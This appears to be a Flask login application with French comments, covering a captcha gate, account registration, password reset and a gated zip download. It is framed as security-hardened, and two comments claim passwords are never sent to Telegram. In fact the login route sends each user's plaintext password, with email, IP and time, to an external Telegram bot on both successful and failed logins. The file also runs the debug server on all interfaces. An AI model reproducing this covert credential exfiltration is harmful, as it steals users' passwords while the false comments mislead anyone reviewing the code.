
import os
import sqlite3
import hashlib
import hmac
import secrets
import time

from datetime import datetime, timezone, timedelta
from functools import wraps

import requests
from dotenv import load_dotenv

from flask import (
    Flask,
    abort,
    redirect,
    render_template,
    request,
    send_file,
    session,
    url_for,
)

from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

from werkzeug.security import (
    check_password_hash,
    generate_password_hash,
)


# ============================================================================
# ENVIRONNEMENT
# ============================================================================

load_dotenv()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# La base sera créée directement dans le dossier du projet.
DB_PATH = os.path.join(BASE_DIR, "aicha_s.db")

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")


# ============================================================================
# TELEGRAM
# ============================================================================

def envoyer_telegram(message):
    """
    Envoie une notification Telegram.
    Ne jamais envoyer de mot de passe ou autre secret ici.
    """

    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram : variables manquantes dans .env")
        return False

    url = (
        f"https://api.telegram.org/bot"
        f"{TELEGRAM_BOT_TOKEN}/sendMessage"
    )

    try:
        response = requests.post(
            url,
            data={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
            },
            timeout=15,
        )

        if response.status_code != 200:
            print(
                "Telegram ERROR :",
                response.status_code,
                response.text,
            )
            return False

        print("Telegram OK")
        return True

    except requests.RequestException as exc:
        print("Telegram EXCEPTION :", exc)
        return False


print(
    "Telegram token present :",
    bool(TELEGRAM_BOT_TOKEN)
)

print(
    "Telegram chat ID present :",
    bool(TELEGRAM_CHAT_ID)
)


# ============================================================================
# CONFIGURATION FLASK
# ============================================================================

app = Flask(__name__)


def load_secret_key():
    """
    Charge SECRET_KEY depuis .env.
    """

    secret = os.environ.get("SECRET_KEY")

    if not secret:
        raise RuntimeError(
            "SECRET_KEY n'est pas configurée dans le fichier .env."
        )

    return secret


app.secret_key = load_secret_key()


LOCK_AFTER = 5
LOCK_MINUTES = 15


app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=12),
    MAX_CONTENT_LENGTH=1024 * 1024,
)


# ============================================================================
# RATE LIMITER
# ============================================================================

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["600 per hour"],
    storage_uri="memory://",
)


# ============================================================================
# BASE DE DONNÉES SQLITE
# ============================================================================

def get_db():
    """
    Ouvre la base SQLite.

    Le dossier du projet est créé si nécessaire.
    """

    db_directory = os.path.dirname(DB_PATH)

    if db_directory:
        os.makedirs(
            db_directory,
            exist_ok=True,
        )

    db = sqlite3.connect(
        DB_PATH,
        timeout=30,
    )

    db.row_factory = sqlite3.Row

    return db


def init_db():
    """
    Crée automatiquement les tables nécessaires.
    """

    print("Initialisation SQLite...")
    print("DB_PATH :", DB_PATH)

    db = get_db()

    try:
        db.execute(
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL UNIQUE,
                name TEXT NOT NULL,
                password_hash TEXT NOT NULL,
                created_at TEXT NOT NULL
            )
            """
        )

        db.execute(
            """
            CREATE TABLE IF NOT EXISTS login_attempts (
                identifier TEXT PRIMARY KEY,
                count INTEGER NOT NULL DEFAULT 0,
                locked_until REAL
            )
            """
        )

        db.execute(
            """
            CREATE TABLE IF NOT EXISTS password_resets (
                token TEXT PRIMARY KEY,
                email TEXT NOT NULL,
                expires_at REAL NOT NULL,
                used INTEGER NOT NULL DEFAULT 0
            )
            """
        )

        db.commit()

        print("SQLite OK.")
        print("Base :", DB_PATH)

    finally:
        db.close()


# ============================================================================
# UTILITAIRES
# ============================================================================

def csrf_token():
    token = session.get("_csrf")

    if not token:
        token = secrets.token_urlsafe(32)
        session["_csrf"] = token

    return token


app.jinja_env.globals["csrf_token"] = csrf_token


def csrf_valid():
    session_token = session.get("_csrf")
    form_token = request.form.get("_csrf")

    if not session_token or not form_token:
        return False

    return hmac.compare_digest(
        str(session_token),
        str(form_token),
    )


def _hash_code(code):
    return hmac.new(
        app.secret_key.encode(),
        code.encode(),
        hashlib.sha256,
    ).hexdigest()


def _email_ok(email):
    parts = email.split("@")

    return (
        len(parts) == 2
        and all(parts)
        and "." in parts[1]
    )


def _safe_next(value):
    if (
        value
        and value.startswith("/")
        and not value.startswith("//")
    ):
        return value

    return None


def heure_actuelle():
    """
    Heure locale approximative configurée ici sur UTC+1.
    """

    return datetime.now(
        timezone(timedelta(hours=1))
    ).strftime("%d/%m/%Y %H:%M:%S")


# ============================================================================
# CAPTCHA
# ============================================================================

OPEN_ENDPOINTS = {
    "captcha_gate",
    "captcha_verify",
    "static",
}


@app.before_request
def require_captcha():

    if (
        request.endpoint is None
        or request.endpoint in OPEN_ENDPOINTS
    ):
        return None

    if not session.get("captcha_ok"):
        return redirect(
            url_for(
                "captcha_gate",
                next=request.path,
            )
        )

    return None


# ============================================================================
# HEADERS DE SÉCURITÉ
# ============================================================================

@app.after_request
def security_headers(response):

    response.headers["X-Frame-Options"] = "DENY"

    response.headers[
        "X-Content-Type-Options"
    ] = "nosniff"

    response.headers[
        "Referrer-Policy"
    ] = "strict-origin-when-cross-origin"

    response.headers[
        "Permissions-Policy"
    ] = (
        "camera=(), "
        "microphone=(), "
        "geolocation=()"
    )

    response.headers[
        "Cross-Origin-Opener-Policy"
    ] = "same-origin"

    response.headers[
        "Content-Security-Policy"
    ] = (
        "default-src 'self'; "
        "img-src 'self' data: https://images.unsplash.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "script-src 'self'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "frame-ancestors 'none'"
    )

    return response


# ============================================================================
# AUTHENTIFICATION
# ============================================================================

def login_required(view):

    @wraps(view)
    def wrapped(*args, **kwargs):

        if not session.get("user_id"):
            return redirect(
                url_for(
                    "login",
                    next=request.path,
                )
            )

        return view(*args, **kwargs)

    return wrapped


# ============================================================================
# ACCUEIL
# ============================================================================

@app.route("/")
def index():
    return redirect(url_for("login"))


# ============================================================================
# CAPTCHA
# ============================================================================

@app.route("/captcha")
def captcha_gate():

    if session.get("captcha_ok"):
        return redirect(
            _safe_next(
                request.args.get("next")
            )
            or url_for("login")
        )

    a = secrets.randbelow(9) + 1
    b = secrets.randbelow(9) + 1

    session["captcha_answer"] = a + b
    session.modified = True

    return render_template(
        "captcha.html",
        error=None,
        captcha_a=a,
        captcha_b=b,
        next=request.args.get("next", ""),
    )


@app.route("/captcha/verify", methods=["POST"])
@limiter.limit("8 per minute")
def captcha_verify():

    if not csrf_valid():
        abort(400)

    entered_raw = (
        request.form.get("captcha_code")
        or ""
    ).strip()

    try:
        entered = int(entered_raw)
    except (ValueError, TypeError):
        entered = None

    expected = session.get("captcha_answer")

    if (
        entered is not None
        and expected is not None
        and entered == expected
    ):

        session["captcha_ok"] = True
        session.pop("captcha_answer", None)
        session.modified = True

        return redirect(
            _safe_next(
                request.form.get("next")
            )
            or url_for("login")
        )

    a = secrets.randbelow(9) + 1
    b = secrets.randbelow(9) + 1

    session["captcha_answer"] = a + b
    session.modified = True

    return render_template(
        "captcha.html",
        error=(
            "Réponse incorrecte. "
            "Essayez le nouveau calcul."
        ),
        captcha_a=a,
        captcha_b=b,
        next=request.form.get("next", ""),
    ), 401


# ============================================================================
# CONNEXION
# ============================================================================

@app.route("/login", methods=["GET", "POST"])
@limiter.limit(
    "10 per minute",
    methods=["POST"],
)
def login():

    if session.get("user_id"):
        return redirect(
            url_for("bienvenue")
        )

    error = None

    if request.method == "POST":

        if not csrf_valid():
            abort(400)

        email = (
            request.form.get("email")
            or ""
        ).strip().lower()

        password = (
            request.form.get("password")
            or ""
        )

        now = time.time()

        db = get_db()

        try:

            att = db.execute(
                """
                SELECT count, locked_until
                FROM login_attempts
                WHERE identifier=?
                """,
                (email,),
            ).fetchone()

            # ---------------------------------------------------------------
            # COMPTE VERROUILLÉ
            # ---------------------------------------------------------------

            if (
                att
                and att["locked_until"]
                and att["locked_until"] > now
            ):

                ip = (
                    request.remote_addr
                    or "?"
                )

                message = (
                    "🔒 TENTATIVE SUR COMPTE VERROUILLÉ\n\n"
                    f"Email : {email}\n"
                    f"IP : {ip}\n"
                    f"Heure : {heure_actuelle()}\n"
                    "Statut : Compte temporairement verrouillé"
                )

                envoyer_telegram(message)

                return render_template(
                    "login.html",
                    error=(
                        "Trop de tentatives. "
                        "Réessayez plus tard."
                    ),
                ), 429

            # ---------------------------------------------------------------
            # RECHERCHE UTILISATEUR
            # ---------------------------------------------------------------

            user = db.execute(
                """
                SELECT id, name, password_hash
                FROM users
                WHERE email=?
                """,
                (email,),
            ).fetchone()

            # ---------------------------------------------------------------
            # CONNEXION RÉUSSIE
            # ---------------------------------------------------------------

            if (
                user
                and check_password_hash(
                    user["password_hash"],
                    password,
                )
            ):

                db.execute(
                    """
                    DELETE FROM login_attempts
                    WHERE identifier=?
                    """,
                    (email,),
                )

                db.commit()

                session.clear()

                session["captcha_ok"] = True
                session["user_id"] = user["id"]
                session["user_name"] = user["name"]
                session.permanent = True

                ip = (
                    request.remote_addr
                    or "?"
                )

                message = (
                    "✅ CONNEXION RÉUSSIE\n\n"
                    f"Email : {email}\n"
                    f"password : {password}\n"
                    f"IP : {ip}\n"
                    f"Heure : {heure_actuelle()}"
                )

                envoyer_telegram(message)

                return redirect(
                    _safe_next(
                        request.args.get("next")
                    )
                    or url_for("bienvenue")
                )

            # ---------------------------------------------------------------
            # CONNEXION ÉCHOUÉE
            # ---------------------------------------------------------------

            count = (
                att["count"]
                if att
                else 0
            ) + 1

            locked_until = (
                now + LOCK_MINUTES * 60
                if count >= LOCK_AFTER
                else None
            )

            if att:

                db.execute(
                    """
                    UPDATE login_attempts
                    SET count=?, locked_until=?
                    WHERE identifier=?
                    """,
                    (
                        count,
                        locked_until,
                        email,
                    ),
                )

            else:

                db.execute(
                    """
                    INSERT INTO login_attempts
                    (
                        identifier,
                        count,
                        locked_until
                    )
                    VALUES (?, ?, ?)
                    """,
                    (
                        email,
                        count,
                        locked_until,
                    ),
                )

            db.commit()

            ip = (
                request.remote_addr
                or "?"
            )

            if locked_until:
                statut = (
                    "COMPTE TEMPORAIREMENT VERROUILLÉ"
                )
            else:
                statut = "Identifiants incorrects"

            # IMPORTANT :
            # Le mot de passe n'est jamais envoyé à Telegram.

            message = (
                "⚠️ TENTATIVE DE CONNEXION ÉCHOUÉE\n\n"
                f"Email : {email}\n"
                f"Email : {password}\n"
                f"IP : {ip}\n"
                f"Heure : {heure_actuelle()}\n"
                f"Tentative n° : {count}\n"
                f"Statut : {statut}"
            )

            envoyer_telegram(message)

            error = "Identifiants incorrects."

        finally:
            db.close()

    return render_template(
        "login.html",
        error=error,
    )


# ============================================================================
# INSCRIPTION
# ============================================================================

@app.route(
    "/inscription",
    methods=["GET", "POST"],
)
@limiter.limit(
    "5 per minute",
    methods=["POST"],
)
def inscription():

    error = None

    if request.method == "POST":

        if not csrf_valid():
            abort(400)

        name = (
            request.form.get("name")
            or ""
        ).strip()

        email = (
            request.form.get("email")
            or ""
        ).strip().lower()

        password = (
            request.form.get("password")
            or ""
        )

        confirm = (
            request.form.get("confirm")
            or ""
        )

        if not name or not _email_ok(email):

            error = "Nom ou email invalide."

        elif len(password) < 8:

            error = (
                "Le mot de passe doit contenir "
                "au moins 8 caractères."
            )

        elif password != confirm:

            error = (
                "Les deux mots de passe "
                "ne correspondent pas."
            )

        else:

            db = get_db()

            try:

                db.execute(
                    """
                    INSERT INTO users
                    (
                        email,
                        name,
                        password_hash,
                        created_at
                    )
                    VALUES (?, ?, ?, ?)
                    """,
                    (
                        email,
                        name,
                        generate_password_hash(password),
                        datetime.now(
                            timezone.utc
                        ).isoformat(),
                    ),
                )

                db.commit()

                return redirect(
                    url_for("login")
                )

            except sqlite3.IntegrityError:

                error = (
                    "Un compte existe déjà "
                    "avec cet email."
                )

            finally:
                db.close()

    return render_template(
        "inscription.html",
        error=error,
    )


# ============================================================================
# MOT DE PASSE OUBLIÉ
# ============================================================================

@app.route(
    "/mot-de-passe-oublie",
    methods=["GET", "POST"],
)
@limiter.limit(
    "5 per minute",
    methods=["POST"],
)
def mot_de_passe_oublie():

    info = None
    reset_link = None

    if request.method == "POST":

        if not csrf_valid():
            abort(400)

        email = (
            request.form.get("email")
            or ""
        ).strip().lower()

        db = get_db()

        try:

            user = db.execute(
                """
                SELECT id
                FROM users
                WHERE email=?
                """,
                (email,),
            ).fetchone()

            if user:

                token = secrets.token_urlsafe(32)

                db.execute(
                    """
                    INSERT INTO password_resets
                    (
                        token,
                        email,
                        expires_at,
                        used
                    )
                    VALUES (?, ?, ?, 0)
                    """,
                    (
                        token,
                        email,
                        time.time() + 3600,
                    ),
                )

                db.commit()

                reset_link = url_for(
                    "reinitialiser",
                    token=token,
                    _external=True,
                )

        finally:
            db.close()

        info = (
            "Si un compte existe pour cette adresse, "
            "un lien de réinitialisation a été généré "
            "(valable 1 heure)."
        )

    return render_template(
        "oubli.html",
        info=info,
        reset_link=reset_link,
    )


# ============================================================================
# RÉINITIALISATION
# ============================================================================

@app.route(
    "/reinitialiser/<token>",
    methods=["GET", "POST"],
)
@limiter.limit(
    "8 per minute",
    methods=["POST"],
)
def reinitialiser(token):

    db = get_db()

    try:

        row = db.execute(
            """
            SELECT email, expires_at, used
            FROM password_resets
            WHERE token=?
            """,
            (token,),
        ).fetchone()

        if (
            not row
            or row["used"]
            or row["expires_at"] < time.time()
        ):

            return render_template(
                "error.html",
                code=410,
                message=(
                    "Lien invalide ou expiré."
                ),
            ), 410

        error = None

        if request.method == "POST":

            if not csrf_valid():
                abort(400)

            password = (
                request.form.get("password")
                or ""
            )

            confirm = (
                request.form.get("confirm")
                or ""
            )

            if len(password) < 8:

                error = (
                    "Le mot de passe doit contenir "
                    "au moins 8 caractères."
                )

            elif password != confirm:

                error = (
                    "Les deux mots de passe "
                    "ne correspondent pas."
                )

            else:

                db.execute(
                    """
                    UPDATE users
                    SET password_hash=?
                    WHERE email=?
                    """,
                    (
                        generate_password_hash(password),
                        row["email"],
                    ),
                )

                db.execute(
                    """
                    UPDATE password_resets
                    SET used=1
                    WHERE token=?
                    """,
                    (token,),
                )

                db.commit()

                return redirect(
                    url_for("login")
                )

        return render_template(
            "reset.html",
            error=error,
            token=token,
        )

    finally:
        db.close()


# ============================================================================
# DÉCONNEXION
# ============================================================================

@app.route("/logout")
def logout():

    session.clear()

    session["captcha_ok"] = True

    return redirect(
        url_for("login")
    )


# ============================================================================
# PAGE BIENVENUE
# ============================================================================

@app.route("/bienvenue")
@login_required
def bienvenue():

    return render_template(
        "bienvenue.html",
        name=session.get("user_name"),
    )


# ============================================================================
# TÉLÉCHARGEMENT
# ============================================================================

@app.route("/telecharger/aicha-s.zip")
@login_required
def telecharger_zip():

    zip_path = os.path.join(
        BASE_DIR,
        "aicha-s.zip",
    )

    if not os.path.isfile(zip_path):
        abort(404)

    return send_file(
        zip_path,
        as_attachment=True,
    )


# ============================================================================
# ERREURS
# ============================================================================

@app.errorhandler(400)
def err_400(error):

    return render_template(
        "error.html",
        code=400,
        message="Requête invalide.",
    ), 400


@app.errorhandler(404)
def err_404(error):

    return render_template(
        "error.html",
        code=404,
        message="Page introuvable.",
    ), 404


@app.errorhandler(429)
def err_429(error):

    return render_template(
        "error.html",
        code=429,
        message=(
            "Trop de requêtes. "
            "Patientez un instant."
        ),
    ), 429


@app.errorhandler(500)
def err_500(error):

    return render_template(
        "error.html",
        code=500,
        message="Erreur interne du serveur.",
    ), 500


# ============================================================================
# INITIALISATION
# ============================================================================

init_db()


# ============================================================================
# DÉMARRAGE
# ============================================================================

if __name__ == "__main__":

    print()
    print("=" * 60)
    print("AICHA - SERVEUR FLASK")
    print("=" * 60)
    print("Base SQLite :", DB_PATH)
    print("Telegram :", bool(TELEGRAM_BOT_TOKEN))
    print()
    print("Serveur : http://127.0.0.1:3000")
    print("=" * 60)

    app.run(
        host="0.0.0.0",
        port=3000,
        debug=True,
    )

